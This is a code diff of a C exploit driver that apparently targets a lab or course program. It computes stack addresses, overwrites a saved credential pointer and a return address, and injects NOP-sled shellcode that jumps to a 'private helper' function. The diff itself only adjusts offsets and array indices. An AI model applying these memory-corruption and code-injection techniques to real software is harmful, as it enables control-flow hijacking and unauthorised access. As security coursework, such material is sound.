@@ -30,7 +30,7 @@ int main() {
     uint64_t cur_auth_bp = cur_main_bp + auth_main_bp_dist;
     uint64_t cur_return_addr_loc = cur_main_bp + main_loop_return_addr_dist;
     uint64_t curr_auth_cred = cur_auth_bp - auth_bp_cred_dist;
-    uint64_t curr_private_helper_addr   = curr_main_loop_return_addr + private_helper_distance;
+    uint64_t curr_private_helper_addr   = curr_main_loop_return_addr + private_helper_distance2;
 
     fprintf(stderr, "driver: Computed\ncur_auth_bp=%lx\ncur_return_addr_loc=%lx\ncur_auth_cred=%lx\ncurr_private_helper_addr=%lx\n", 
             cur_auth_bp, cur_return_addr_loc, curr_auth_cred, curr_private_helper_addr);
@@ -45,7 +45,7 @@ int main() {
     memset((void*)expl, '\1', explsz);
     expl[explsz/sizeof(void*)-4] = (void*) 0x0000000000000000;
     expl[explsz/sizeof(void*)-3] = (void*) 0x00000000000001f0;
-    expl[explsz/sizeof(void*)-2] = (void*) curr_auth_cred + 32;
+    expl[explsz/sizeof(void*)-2] = (void*) curr_auth_cred + 10;
     expl[explsz/sizeof(void*)-1] = (void*) cur_return_addr_loc - 16;
 
     put_str("p ");
@@ -131,7 +131,7 @@ int main() {
     *expl = (void**)malloc(explsz);
     memset((void*)expl, 0x90, explsz);
 
-    uint64_t injected_code[64] = {
+    uint64_t injected_code[32] = {
         0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
         0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov    <private helper addr>, %rax
 	    0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
@@ -142,7 +142,7 @@ int main() {
     // Setting private helper addr in the injected code
     for (int i = 0; i < 8; i++) {
         uint8_t byte = (curr_private_helper_addr >> (i * 8)) & 0xFF;
-        injected_code[i+2] = byte;
+        injected_code[i+10] = byte;
     }
 
     // Adding the injected code to expl
